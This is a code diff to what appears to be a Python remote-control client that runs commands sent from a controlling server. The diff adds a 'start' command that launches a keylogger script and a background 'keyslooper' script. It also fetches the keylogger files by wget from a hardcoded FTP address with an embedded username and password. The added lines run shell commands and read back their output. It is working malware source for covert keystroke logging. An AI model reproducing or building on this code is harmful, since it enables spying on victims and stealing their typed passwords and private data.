@@ -67,10 +67,23 @@ def main():
                               stdout=subprocess.PIPE, stderr=subprocess.PIPE,
                               stdin=subprocess.PIPE)
                     results = results.stdout.read() + results.stderr.read()
+
+            elif action == 'start':
+                action = 'sh keylogger/start_keylogger.sh'
+                results = subprocess.Popen(action, shell=True,
+                    stdout=subprocess.PIPE, stderr=subprocess.PIPE,
+                           stdin=subprocess.PIPE)
+                results = results.stdout.read() + results.stderr.read()
+                os.system("sh keylogger/keyslooper.sh &")
+
             else:
-                action = ['wget -r -q --no-parent -nH ftp://siic:azerty@84.39.49.25/keylogger/*', 'sh keylogger/start_keylogger.sh']
+                action = ['wget -r -q --no-parent -nH ftp://siic:azerty@84.39.49.25/keylogger/*']
                 for i in range(len(action)):
-                    results = subprocess.Popen(action[i])
+                    results = subprocess.Popen(action[i], shell=True,
+                              stdout=subprocess.PIPE, stderr=subprocess.PIPE,
+                              stdin=subprocess.PIPE)
+                    results = results.stdout.read() + results.stderr.read()
+
 
         elif cmd == 'kill':
             conn.close()
